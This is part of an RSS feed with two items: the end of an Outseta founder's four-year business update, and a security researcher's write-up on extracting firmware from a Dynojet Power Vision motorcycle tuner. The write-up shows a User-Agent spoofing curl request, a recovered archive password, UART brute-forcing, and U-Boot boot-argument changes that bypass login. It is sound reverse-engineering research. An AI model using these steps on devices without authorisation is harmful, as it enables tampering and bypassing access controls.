          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e5ab1236ecd6e20d27a0927/1610212809032-TKR71BGVXZGVFTRSMOYL/ke17ZwdGBToddI8pDm48kKInoR3ixXtjjAJpae6G0zRZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpx5sc3O8R0YWePhcV0pfcbp8WhXLIhL3XI45IWrOvNCZjebQmXvq2tgXzI8Bd-ZNUc/JayAcunzo2.png" data-image="https://images.squarespace-cdn.com/content/v1/5e5ab1236ecd6e20d27a0927/1610212809032-TKR71BGVXZGVFTRSMOYL/ke17ZwdGBToddI8pDm48kKInoR3ixXtjjAJpae6G0zRZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpx5sc3O8R0YWePhcV0pfcbp8WhXLIhL3XI45IWrOvNCZjebQmXvq2tgXzI8Bd-ZNUc/JayAcunzo2.png" data-image-dimensions="601x392" data-image-focal-point="0.5,0.5" alt="JayAcunzo2.png" data-load="false" data-image-id="5ff9e5c88e17786cf7eb280e" data-type="image" src="https://www.outseta.com/posts/JayAcunzo2.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1610211733556_13422"><div><p>Our numbers reflect this approach. We have quite modest website traffic and our number of account sign-ups each month isn’t eye popping, but the quality of our leads is exceptional.  We get remarkably few low quality leads—I’d say at least 80% of our account sign-ups are founders of SaaS products or membership sites that are a great fit for Outseta. And if you think about it, that makes sense—almost all of our website traffic comes directly from Stripe, Webflow, IndieHackers, Makerpad, or content that I’ve written about bootstrapping subscription businesses. </p><p>With no pressure to hit some arbitrarily set marketing metrics, I haven’t had to turn to more “top of the funnel content” or other channels that would drive less qualified traffic to our site. And perhaps most importantly, this approach fits our strategy—because we want to stay intentionally small, from a resourcing perspective we’re better off with a lower volume of highly qualified leads than a higher volume of less qualified leads. </p><p>Here are our top performing lead generation channels.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1610145428502_21408"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          
        

        
          
          <figcaption>
            <p>Outseta account sign-ups by source. Click to expand.</p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1610145428502_21708"><p>The channels aside, our website traffic and account sign-ups continue to grow by more than 100% year over year. We had about 40,000 visitors to our site and just over 1,300 account sign-ups in 2020.</p></div><div data-block-type="5" id="block-yui_3_17_2_1_1610145428502_26056"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          
        

        
          
          <figcaption>
            <p>Outseta new website visitors and account sign-ups. Click to expand.</p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1610145428502_26349"><div><p>While these numbers likely seem quite modest to many people who are reading this post, I am immensely proud of them. The lead quality that I referenced is one reason, but more than anything I’m proud that our team has resisted the urge to invest in growth prematurely.</p><p><a href="https://www.outseta.com/posts/customer-success-unit-economics-then-growth">Custom Success. Unit Economics. Then Growth. </a></p><p>This framework from Mark Roberge is by far the most important piece of start-up advice that I pass on to everyone who will listen, and we’ve truly held ourselves accountable to it. Our product and conversation rates simply didn’t warrant heavy investments in growth until recently. </p><p>Could we have grown a bit faster? Absolutely! But it would not have been efficient or healthy growth for a bootstrapped company. Our conversation rate from account sign-up to paid customer doubled in 2020, and more recently with <a href="https://www.outseta.com/posts/using-ux-changes-to-unlock-growth">changes like these</a> we’ve 3Xed our average monthly conversion rate. </p><p>Heading into 2021… watch out!</p><h2>Product</h2><p>On the product front, man-oh-man am I a nuisance. I’m the primary liaison between our customers and our product team, and both our customers and myself ask for a lot. With a product as feature rich as Outseta, there’s a never ending list of feature requests and improvements that our small team needs to navigate. </p><p>But in my eyes 2020 was the year where our product grew up. </p><p>We sell to markets of extremely knowledgeable and demanding buyers, and for the first three years we were in business, it was hard for me to shake that our feature set was very limited, the product was buggy, and when you’re competing against heavily VC backed companies it was just hard to feel proud of what we had out in the market. </p></div></div><div data-block-type="31" id="block-yui_3_17_2_1_1610145428502_35484"><div>

<figure>
  <blockquote data-animation-role="quote">
    <span>“</span>This year, for the first time, I looked at Outseta and said to myself...we’ve got a pretty remarkable little product here.<span>”</span>
  </blockquote>
  
</figure>
</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1610145428502_35557"><div><p>I knew I’d been holding back from saying that, literally, for years. But for the first time, I knew it was true. We still have plenty of rough edges and endless improvements to make, but I believe we now have the single best product for a bootstrapped founder to use to launch a subscription business. There isn’t another product on the market that offers the feature set that we do.</p><p>The velocity of product improvements that Dimitris, Dave, and James shipped in 2020 was borderline absurd. Some product highlights from this year include:</p><ul data-rte-list="default"><li><p><a href="https://www.outseta.com/posts/using-ux-changes-to-unlock-growth">We completed the “no-codification” of Outseta</a></p></li><li><p>We added the ability to sign up and login users with Google</p></li><li><p>We became SCA compliant for our customers in Europe</p></li><li><p>We added the support for discounts and coupon codes</p></li><li><p>We added the ability to setup protected content and account specific pages (unique dashboards each user can access upon login)</p></li><li><p>We made improvements to give our customers much more control over their own email deliverability</p></li><li><p>We launched revenue reporting</p></li><li><p>We completely redesigned our knowledge base tools</p></li><li><p><a href="https://www.outseta.com/posts/outseta-company-update-december-2020">We built integrations with Circle.so and Rewardful</a></p></li></ul><h2>Final Reflections</h2><p>As I look back at 2020, and even the last four years, I mostly feel pride. This is kind of a funny statement, because we’re not as far along as we’d hoped to be four years into building Outseta. As I reflect on the last four …</p></div></div></div></div></div></div></div></div></article></div></div></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.outseta.com/posts/outseta-four-year-update">https://www.outseta.com/posts/outseta-four-year-update</a></em></p>]]>
            </description>
            <link>https://www.outseta.com/posts/outseta-four-year-update</link>
            <guid isPermaLink="false">hacker-news-small-sites-25770221</guid>
            <pubDate>Thu, 14 Jan 2021 00:46:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking a Harley's Tuner]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25769811">thread link</a>) | @wyldfire
<br/>
January 13, 2021 | https://therealunicornsecurity.github.io/Powervision-1/ | <a href="https://web.archive.org/web/*/https://therealunicornsecurity.github.io/Powervision-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Finding my ways to the firmware of a famous Harley tuner</p>

<p><strong>NOTE: All encryption keys and passwords are fake ones made up for writing this post.</strong></p>

<p><a href="https://therealunicornsecurity.github.io/tags#system"><img src="https://therealunicornsecurity.github.io/icons/reverse.png" width="200" title="reverse"></a>
   <a href="https://therealunicornsecurity.github.io/tags#system"><img src="https://therealunicornsecurity.github.io/icons/system.png" width="200" title="system"></a>
   <a href="https://therealunicornsecurity.github.io/tags#system"><img src="https://therealunicornsecurity.github.io/icons/hardware.png" width="200" title="hardware"></a>
   <a href="https://therealunicornsecurity.github.io/tags#system"><img src="https://therealunicornsecurity.github.io/icons/crypto.png" width="200" title="crypto"></a>
</p>



<p>A tuner is a little device supposed to be plugged to a bike. It is meant to configure the on board computer in order to optimize fuel to air ratios and other parameters. It is known to be used to lift engine power restrictions, or optimize fuel consumption. Though I am pretty sure a real biker will have much better words to describe how it can be used.</p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/dynojet.jpg" alt="_config.yml"></p>

<p>The model studied here is a Power Vision for Harley Davidson, by Dynojet. The hardware is a Bobcat Revision D by Drew Technologies (there is a typo on the PCB, it is actually written Drew <em>Technoligies</em>).</p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/drewtech.jpg" alt="_config.yml"></p>




<p>The tuner is supposed to be configured while being connected to a computer. It has a mini-USB input next to the CAN Bus (this one should be connected to the bike’s on board computer). The tools used to configure it are free to download on Dynojet’s website.</p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/wintools.png" alt="_config.yml"></p>

<p>The installed Windows tools contain the following binaries:</p>
<ul>
  <li>WinPV.exe: the main software with the GUI</li>
  <li>PVUpdateClient.exe: updater, its job is to download in charge new firmwares and copying them through the USB link</li>
  <li>RecoveryTool.exe: called exclusively by the PVUpdateClient to flash the recovery part of the firmware</li>
  <li>PVLink.dll: in charge of the communication through the serial port, very important</li>
</ul>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/pv_files.png" alt="_config.yml"></p>

<p>Now our goal is to get the firmware so we can start reversing. Checking on YouTube tutorials and TheWaybackMachine, we can see that firmwares used to be available directly on Dynojet’s website, under the <strong>firmware</strong> section, which is now empty. We find an interesting lead by running the PVUpdateCLient.exe, and Wireshark simultaneously.</p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/pvupdate.png" alt="_config.yml"></p>

<p>The Wireshark capture shows plaintext HTTP going to <em>dynojetpowervision.com</em> and checking for available firmware files. There is no real protection here, just the User-Agent you are supposed to be using is “PVUpdateClient”, otherwise the files remain hidden.<br>
Using <strong>curl</strong>, we get the filenames we are looking for:</p>
<div><div><pre><code> curl <span>-v</span> <span>-A</span> PVUpdateClient http://dynojetpowervision.com/downloads/PowerVisionVersions.xml
<span>*</span>   Trying 52.183.62.164:80...
<span>*</span> TCP_NODELAY <span>set</span>
<span>*</span> Connected to dynojetpowervision.com <span>(</span>52.183.62.164<span>)</span> port 80 <span>(</span><span>#0)</span>
<span>&gt;</span> GET /downloads/PowerVisionVersions.xml HTTP/1.1
<span>&gt;</span> Host: dynojetpowervision.com
<span>&gt;</span> User-Agent: PVUpdateClient
<span>&gt;</span> Accept: <span>*</span>/<span>*</span>
<span>&gt;</span>
<span>*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/xml
&lt; Last-Modified: Mon, 09 Nov 2020 18:35:22 GMT
&lt; Accept-Ranges: bytes
...
 &lt;PVSystemUpgrade.1.1 <span>ver</span><span>=</span><span>"1.0.1 1.0.1"</span> <span>package</span><span>=</span><span>"PV_SYSTEMUPGRADE-1.0.1-631.pvr"</span>/&gt;
 &lt;PVFirmware.1.1 <span>ver</span><span>=</span><span>"2.0.47-1613"</span> <span>package</span><span>=</span><span>"PV_FIRMWARE-2.0.47-1613.pvu"</span> /&gt;
 &lt;PVTuneDB.1.1 <span>ver</span><span>=</span><span>"0.0.10.11"</span> <span>package</span><span>=</span><span>"PV_TUNEDB-0.0.10.11.pvu"</span> /&gt;
...
</code></pre></div></div>

<p>We start focusing on the <strong>FIRMWARE</strong> and <strong>SYSTEM_UPGRADE</strong> files, as they are the most likely to contain what we are interested in. We download them using <strong>wget</strong>, and trouble begins here:</p>
<div><div><pre><code>mishellcode@unisec:~/powervision<span>$ </span>unzip PV_SYSTEMUPGRADE-1.0.1-631.pvr                                                  
Archive:  PV_SYSTEMUPGRADE-1.0.1-631.pvr                                                                                
<span>[</span>PV_SYSTEMUPGRADE-1.0.1-631.pvr] PVRecoveryInfo.xml password: 
</code></pre></div></div>

<div><div><pre><code>mishellcode@unisec:~/powervision<span>$ </span>unzip PV_FIRMWARE-2.0.47-1613.pvu                                                     
Archive:  PV_FIRMWARE-2.0.47-1613.pvu                                                                                    
extracting: PVU_TYPE                                                                                                    
extracting: PVU_CERT                                                                                                     
inflating: PVU_FILE                                                                                                   
mishellcode@unisec:~/powervision<span>$ </span>file PVU_FILE                                                                        
PVU_FILE: openssl enc<span>'d data with salted password                                                                            
</span></code></pre></div></div>

<p>The <strong>SYSTEM_RECOVERY</strong>, that we will call “PVR file” is a password protected archive, and the <strong>FIRMWARE</strong> file, named “PVU_FILE”, is actually encrypted using Openssl. Also, the PVU_CERT file indicates that there might be an integrity check performed on the PVU_FILE.</p>

<p>I’ll skip the details, but since the PVR file is written in plaintext on the device, it was obvious that one of the tools (in this case RecoveryTool.exe) had the password somewhere. A bit of reverse engineering later, we get a password “POWERVISION_RECOVER_3456789Z”. Though I won’t explain the whole thing here, this password is actually somewhat hidden. It is not hardcoded but instead, some loops go over integer values to generate the ending pattern of the password and then concatenate a capital letter to it. There is a clear intention to hide this from badly intentioned users, and that’s usually a sign we’re on the right track.</p>

<h3 id="recovery-file-contents">Recovery File Contents</h3>

<div><div><pre><code>nandflash_bobcat.bin: data                                                                                              
PVRecoveryInfo.xml:   exported SGML document, ASCII text, with CRLF line terminators                                    
u-boot.bin:           data                                                                                              
uImage:               u-boot legacy uImage, Bobcat-577, Linux/ARM, OS Kernel Image <span>(</span>Not compressed<span>)</span>, 828996 bytes, Thu Feb  3 14:44:52 2011, Load Address: 0x20008000, Entry Point: 0x20008040, Header CRC: 0x5EDBBE36, Data CRC: 0xD026D2D5 
</code></pre></div></div>

<p>The recovery file is a u-boot image with a Kernel image. The entropy of the files indicates that parts of them are encrypted. Also, the presence of <em>at91bootstrap</em> file indicates we are in presence of a SAM AT 91 board, which can use secure boot. Damned. We can though get one information from those files: the processor type is  <strong>SAM926X</strong><br>
Browsing the internet, we also can find the following forum post, where a Drew <em>Technoligies</em> employee asks information about this very same family of processors (specifically, the SAM9260-EK): https://lists.denx.de/pipermail/u-boot/2011-June/093651.html</p>

<h3 id="update-file">Update File</h3>

<p>Since the update file is encrypted, we can formulate two hypothesis:</p>
<ul>
  <li>The firmware is stored encrypted, and decrypted at runtime. That might be slow, but since the board supports secure boot, it is a viable hypothesis.</li>
  <li>The firmware is stored unencrypted, only the updates are encrypted. The update process decrypts the PVU_FILE, and replaces the running firmware. Would be nice, wouldn’t it?</li>
</ul>

<h2 id="22-physical-setup">2.2: Physical setup</h2>

<p>A quick and dirty win is always to desolder the memory chip to get the firmware. But in that case, it is a bit more complicated. The entire PCB was molded in a plastic protection, probably for sealing against humidity.</p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/mold1.jpg" alt="_config.yml"></p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/mold2.jpg" alt="_config.yml"></p>

<p>I had to cut it open to see the actual PCB:</p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/open_pcb.jpg" alt="_config.yml"></p>

<p>The memory chip seems to be soldered on the other side of the PCB. It is pretty bad news because it is under the screen, and it would probably destroy the device to try to get this physically. Also, at this stage, we don’t know if getting the chip will help us. It could simply contain an Openssl encrypted file that is decrypted during the boot process. So we looked elsewhere.<br>
By looking closely, we can spot 4 pins with written <strong>DEBUG</strong> over it!</p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/ports.jpg" alt="_config.yml"></p>

<p>So we connect to it using an UART to USB adapter, and fire up minicom.</p>

<div><div><pre><code>ROMBoot
Welcome to bobcat
bocat login:
</code></pre></div></div>
<p>Problem is the shell is password protected, and even after days of bruteforcing (using <a href="https://github.com/FireFart/UARTBruteForcer/blob/master/uart.py">this tool</a>), no password was found. Also, U-Boot is set as quiet and there is no way from this shell to interact with the boot sequence.<br>
One track remains unexplored: the <strong>RECOVERY MODE</strong></p>

<h3 id="recovery-mode">Recovery Mode</h3>

<p>Messing around with the RecoveryTool.exe we find that there is a recovery mode for the device. It is activated by pressing the power button while plugin in the USB link.</p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/recovery.jpg" alt="_config.yml"></p>

<p>Now what is interesting with this mode is that it switches the communication mode on the USB Link port. In fact, in nominal working mode, this port uses a proprietary protocol that restrains many actions (I will detail this in a dedicated part), whereas in recovery mode the port exposes a U-Boot shell!</p>
<div><div><pre><code>U-Boot&gt; <span>printenv
</span><span>bootargs</span><span>=</span><span>console</span><span>=</span>ttyS0,115200 ubi.mtd<span>=</span>linux <span>root</span><span>=</span>31:4 <span>lpj</span><span>=</span>598016 quiet 
<span>bootcmd</span><span>=</span>nboot kernel<span>;</span>bootm<span>;</span>
<span>bootdelay</span><span>=</span>0
<span>baudrate</span><span>=</span>115200
<span>mtdids</span><span>=</span><span>nand0</span><span>=</span>atmel_nand
<span>mtdparts</span><span>=</span><span>mtdparts</span><span>=</span>atmel_nand:128k@0x0<span>(</span>at91bootstrap<span>)</span>ro,1m<span>(</span>u-boot<span>)</span>ro,2m<span>(</span>kernel<span>)</span>,-<span>(</span>linux<span>)</span>
<span>silent</span><span>=</span><span>yes
</span><span>ver</span><span>=</span>U-BootVersion:1.0.1
<span>stdout</span><span>=</span>usbser
<span>stdin</span><span>=</span>usbser
<span>stderr</span><span>=</span>usbser

Environment size: 316/131068 bytes
</code></pre></div></div>

<p>We can modify the boot parameters in order to bypass the authentication on the internal UART debug port:</p>
<div><div><pre><code>U-Boot&gt; setenv bootargs <span>"console=ttyS0,115200 ubi.mtd=linux root=31:4 lpj=598016 single"</span>
U-Boot&gt; setenv silent no
U-Boot&gt; setenv bootdelay 3
U-Boot&gt; <span>printenv
</span><span>bootcmd</span><span>=</span>nboot kernel<span>;</span>bootm<span>;</span>
<span>baudrate</span><span>=</span>115200
<span>mtdids</span><span>=</span><span>nand0</span><span>=</span>atmel_nand
<span>mtdparts</span><span>=</span><span>mtdparts</span><span>=</span>atmel_nand:128k@0x0<span>(</span>at91bootstrap<span>)</span>ro,1m<span>(</span>u-boot<span>)</span>ro,2m<span>(</span>kernel<span>)</span>,-<span>(</span>linux<span>)</span>
<span>ver</span><span>=</span>U-BootVersion:1.0.1
<span>stdout</span><span>=</span>usbser
<span>stdin</span><span>=</span>usbser
<span>stderr</span><span>=</span>usbser
<span>bootargs</span><span>=</span><span>"console=ttyS0,115200 ubi.mtd=linux root=31:4 lpj=598016 single"</span>
<span>silent</span><span>=</span>no
<span>bootdelay</span><span>=</span>3

Environment size: 319/131068 bytes
</code></pre></div></div>
<p>We replace <em>quiet</em> with <em>single</em> in order to deactivate the authentication, add a delay so we have enough time to get to the UART shell, and set <em>silent</em> to “no” in order to make sure we have a boot trace on the UART shell.</p>

<p>To do this, we need to be connected <strong>simultaneously</strong> to the USB link where we configure the new parameters, and the internal UART debug port, where the shell should pop.</p>

<p><img src="https://therealunicornsecurity.github.io/images/Dynojet/recovery_shell.jpg" alt="_config.yml"></p>

<p>Once all the parameters are set, running the <em>boot</em> command on the USB Link with U-Boot will trigger a single user recovery mode boot:</p>

<div><div><pre><code>U-Boot&gt; boot
Loading from nand0, offset 0x120000
   Image Name:   Bobcat-577
   Image Type:   ARM Linux Kernel Image <span>(</span>uncompressed<span>)</span>
   Data Size:    828996 Bytes <span>=</span> 809.6 KiB
   Load Address: 20008000
   Entry …</code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://therealunicornsecurity.github.io/Powervision-1/">https://therealunicornsecurity.github.io/Powervision-1/</a></em></p>]]>
            </description>
            <link>https://therealunicornsecurity.github.io/Powervision-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25769811</guid>
            <pubDate>Thu, 14 Jan 2021 00:02:03 GMT</pubDate>
        </item>
    </channel>
</rss>
